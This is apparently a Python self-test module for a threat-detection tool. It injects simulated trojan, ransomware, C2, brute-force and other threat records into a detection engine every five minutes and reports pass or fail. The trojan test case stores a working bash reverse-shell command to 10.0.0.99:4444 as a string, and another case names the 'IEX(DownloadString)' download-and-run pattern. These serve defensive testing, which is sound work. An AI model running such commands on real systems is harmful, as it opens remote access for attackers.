"""
AISS — Self-Test Engine
════════════════════════
Automatically tests every detection module by injecting simulated
"virus" patterns, then verifying AISS detected and resolved them.

Flow (every 5 minutes):
  1. Inject a fake threat directly into ThreatEngine
  2. Wait for detection
  3. Verify it was registered
  4. Auto-resolve it (clean up)
  5. Print PASS / FAIL to terminal

Tests covered:
  ✔ Malware detection       (Trojan, Cryptominer, Ransomware, Keylogger)
  ✔ Network threats         (Port Scan, C2 Traffic, DNS Hijack, Brute Force)
  ✔ File threats            (Malicious Script, Suspicious File, Virus hash)
  ✔ Deception / Honeypot    (Intrusion via honeypot)
  ✔ Response Engine         (verify auto-resolve fires)
  ✔ Threat persistence      (threat survives in active_threats dict)
  ✔ Live feed               (live_monitor prints the line)
"""

import asyncio
import time
import os
import sys
from datetime import datetime
from models.threat import Threat, ThreatType, ThreatSeverity, ThreatStatus
from utils.logger import setup_logger

logger = setup_logger("self_test")

# ── ANSI colours ──────────────────────────────────────────────────────
R   = "\033[91m"
Y   = "\033[93m"
G   = "\033[92m"
C   = "\033[96m"
W   = "\033[97m"
B   = "\033[94m"
DIM = "\033[2m"
RST = "\033[0m"

# ── How often to run the full test suite (seconds) ────────────────────
TEST_INTERVAL_SECS = 300   # every 5 minutes

# ── All test cases ────────────────────────────────────────────────────
TEST_CASES = [
    # (name, threat_kwargs)
    (
        "Trojan Process Detection",
        dict(
            type        = ThreatType.TROJAN,
            description = "[SELF-TEST] Fake reverse-shell trojan: bash -i >& /dev/tcp/10.0.0.99/4444",
            severity    = ThreatSeverity.CRITICAL,
            source      = "PID:99999",
            module      = "SelfTest",
            metadata    = {"cmdline": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1", "test": True},
        ),
    ),
    (
        "Cryptominer Detection",
        dict(
            type        = ThreatType.CRYPTOMINER,
            description = "[SELF-TEST] Fake XMRig miner process (CPU 99%)",
            severity    = ThreatSeverity.HIGH,
            source      = "PID:88888",
            module      = "SelfTest",
            metadata    = {"process": "xmrig", "cpu_usage": 99, "test": True},
        ),
    ),
    (
        "Ransomware Activity",
        dict(
            type        = ThreatType.RANSOMWARE,
            description = "[SELF-TEST] Fake ransomware — 50 files encrypted with .wnry",
            severity    = ThreatSeverity.CRITICAL,
            source      = "C:\\Users\\test",
            module      = "SelfTest",
            metadata    = {"encrypted_count": 50, "extension": ".wnry", "test": True},
        ),
    ),
    (
        "Brute Force Attack",
        dict(
            type        = ThreatType.BRUTE_FORCE,
            description = "[SELF-TEST] Fake SSH brute force from 185.0.0.1 — 200 attempts",
            severity    = ThreatSeverity.CRITICAL,
            source      = "185.0.0.1",
            module      = "SelfTest",
            metadata    = {"target_user": "root", "attempt_count": 200, "test": True},
        ),
    ),
    (
        "C2 Traffic Detection",
        dict(
            type        = ThreatType.C2_TRAFFIC,
            description = "[SELF-TEST] Fake C2 beacon to 185.220.0.1:4444",
            severity    = ThreatSeverity.CRITICAL,
            source      = "185.220.0.1",
            module      = "SelfTest",
            metadata    = {"remote_port": 4444, "protocol": "TCP", "test": True},
        ),
    ),
    (
        "Port Scan Detection",
        dict(
            type        = ThreatType.PORT_SCAN,
            description = "[SELF-TEST] Fake port scan — 500 ports probed from 10.0.0.1",
            severity    = ThreatSeverity.HIGH,
            source      = "10.0.0.1",
            module      = "SelfTest",
            metadata    = {"ports_scanned": list(range(1, 500)), "test": True},
        ),
    ),
    (
        "DNS Hijack Detection",
        dict(
            type        = ThreatType.DNS_HIJACK,
            description = "[SELF-TEST] Fake DNS hijack — google.com → 10.10.10.1",
            severity    = ThreatSeverity.CRITICAL,
            source      = "10.10.10.1",
            module      = "SelfTest",
            metadata    = {"domain": "google.com", "expected": "142.250.80.46", "resolved": "10.10.10.1", "test": True},
        ),
    ),
    (
        "Keylogger Detection",
        dict(
            type        = ThreatType.KEYLOGGER,
            description = "[SELF-TEST] Fake keylogger process 'logkeys' capturing keystrokes",
            severity    = ThreatSeverity.HIGH,
            source      = "PID:77777",
            module      = "SelfTest",
            metadata    = {"process": "logkeys", "test": True},
        ),
    ),
    (
        "Malicious Script Detection",
        dict(
            type        = ThreatType.MALICIOUS_SCRIPT,
            description = "[SELF-TEST] Fake malicious script with reverse shell payload",
            severity    = ThreatSeverity.HIGH,
            source      = "C:\\Windows\\Temp\\update.ps1",
            module      = "SelfTest",
            metadata    = {"pattern": "IEX(DownloadString)", "path": "C:\\Windows\\Temp\\update.ps1", "test": True},
        ),
    ),
    (
        "Honeypot Intrusion",
        dict(
            type        = ThreatType.INTRUSION,
            description = "[SELF-TEST] Fake honeypot trigger — admin_passwords.txt accessed",
            severity    = ThreatSeverity.CRITICAL,
            source      = "192.168.1.200",
            module      = "SelfTest",
            metadata    = {"asset": "admin_passwords.txt", "source_ip": "192.168.1.200", "test": True},
        ),
    ),
    (
        "Rootkit Indicator",
        dict(
            type        = ThreatType.ROOTKIT,
            description = "[SELF-TEST] Fake rootkit — 10 hidden processes in /proc",
            severity    = ThreatSeverity.CRITICAL,
            source      = "kernel",
            module      = "SelfTest",
            metadata    = {"hidden_pids": [str(i) for i in range(1000, 1010)], "test": True},
        ),
    ),
    (
        "Worm / Lateral Movement",
        dict(
            type        = ThreatType.WORM,
            description = "[SELF-TEST] Fake worm spreading via SMB on 10.0.0.x",
            severity    = ThreatSeverity.CRITICAL,
            source      = "10.0.0.0/24",
            module      = "SelfTest",
            metadata    = {"protocol": "SMB", "subnet": "10.0.0.0/24", "test": True},
        ),
    ),
]


# ══════════════════════════════════════════════════════════════════════
# RUNNER
# ══════════════════════════════════════════════════════════════════════

class SelfTestEngine:
    def __init__(self, threat_engine):
        self.engine   = threat_engine
        self.run_count = 0
        self._results: list[dict] = []

    # ── Print helpers ─────────────────────────────────────────────────

    def _header(self, text: str) -> None:
        print(f"\n{B}{'═' * 60}{RST}", flush=True)
        print(f"{B}  {text}{RST}", flush=True)
        print(f"{B}{'═' * 60}{RST}", flush=True)

    def _pass(self, name: str, ms: float) -> None:
        print(
            f"{DIM}[AISS TEST]{RST} {G}✅ PASS{RST}  {W}{name:<35}{RST} "
            f"{DIM}{ms:.0f}ms{RST}",
            flush=True,
        )

    def _fail(self, name: str, reason: str) -> None:
        print(
            f"{DIM}[AISS TEST]{RST} {R}❌ FAIL{RST}  {W}{name:<35}{RST} "
            f"{R}{reason}{RST}",
            flush=True,
        )

    def _info(self, text: str) -> None:
        print(f"{DIM}[AISS TEST]{RST} {C}{text}{RST}", flush=True)

    # ── Single test ───────────────────────────────────────────────────

    async def _run_one(self, name: str, threat_kwargs: dict) -> bool:
        threat = Threat(**threat_kwargs)
        tid    = threat.id
        t0     = time.monotonic()

        try:
            # 1. Inject threat
            await self.engine.register_threat(threat)

            # 2. Verify it landed in active_threats
            await asyncio.sleep(0.1)
            if tid not in self.engine.active_threats:
                self._fail(name, "threat not found in active_threats after injection")
                return False

            elapsed_detect = (time.monotonic() - t0) * 1000

            # 3. Auto-resolve (clean up — mark as SELF-TEST resolved)
            await self.engine.resolve_threat(tid, f"[SELF-TEST PASS] Auto-resolved after verification")

            # 4. Verify resolved
            await asyncio.sleep(0.05)
            resolved = self.engine.active_threats.get(tid)
            if resolved and resolved.status != ThreatStatus.RESOLVED:
                self._fail(name, f"resolve_threat did not set RESOLVED status")
                return False

            self._pass(name, elapsed_detect)
            return True

        except Exception as e:
            self._fail(name, str(e))
            return False

    # ── Full suite ────────────────────────────────────────────────────

    async def run_suite(self) -> None:
        self.run_count += 1
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        self._header(f"AISS SELF-TEST  •  Run #{self.run_count}  •  {now}")
        self._info(f"Running {len(TEST_CASES)} tests...\n")

        passed = 0
        failed = 0
        t_start = time.monotonic()

        for name, kwargs in TEST_CASES:
            ok = await self._run_one(name, kwargs)
            if ok:
                passed += 1
            else:
                failed += 1
            await asyncio.sleep(0.3)   # small gap between tests

        total_ms = (time.monotonic() - t_start) * 1000

        # ── Summary ───────────────────────────────────────────────────
        print(f"\n{B}{'─' * 60}{RST}", flush=True)
        score_color = G if failed == 0 else (Y if failed <= 2 else R)
        print(
            f"{DIM}[AISS TEST]{RST}  RESULT: "
            f"{score_color}{passed}/{len(TEST_CASES)} PASSED{RST}  "
            f"{R}{failed} FAILED{RST}  "
            f"{DIM}({total_ms:.0f}ms total){RST}",
            flush=True,
        )

        if failed == 0:
            print(
                f"{DIM}[AISS TEST]{RST} {G}🛡️  All systems healthy — detection is working perfectly.{RST}\n",
                flush=True,
            )
        elif failed <= 2:
            print(
                f"{DIM}[AISS TEST]{RST} {Y}⚠️  Minor issues — {failed} module(s) need attention.{RST}\n",
                flush=True,
            )
        else:
            print(
                f"{DIM}[AISS TEST]{RST} {R}🔴  CRITICAL — {failed} modules failed. Check logs immediately.{RST}\n",
                flush=True,
            )
        print(f"{B}{'═' * 60}{RST}\n", flush=True)

        logger.info(
            f"Self-test run #{self.run_count} complete: "
            f"{passed}/{len(TEST_CASES)} passed, {failed} failed "
            f"({total_ms:.0f}ms)"
        )


# ══════════════════════════════════════════════════════════════════════
# BACKGROUND LOOP
# ══════════════════════════════════════════════════════════════════════

async def self_test_loop(threat_engine, interval: int = TEST_INTERVAL_SECS) -> None:
    """
    Background asyncio task.
    Waits `interval` seconds, then runs the full test suite, forever.
    First run happens immediately after a short warm-up delay.
    """
    runner = SelfTestEngine(threat_engine)

    # Short warm-up — let uvicorn fully start first
    await asyncio.sleep(15)

    while True:
        try:
            await runner.run_suite()
        except Exception as e:
            logger.error(f"Self-test suite crashed: {e}")

        # Wait before next run
        next_run = datetime.now().strftime("%H:%M:%S")
        print(
            f"{DIM}[AISS TEST]{RST} {C}Next self-test in {interval // 60} min "
            f"(at approx {next_run}){RST}",
            flush=True,
        )
        await asyncio.sleep(interval)
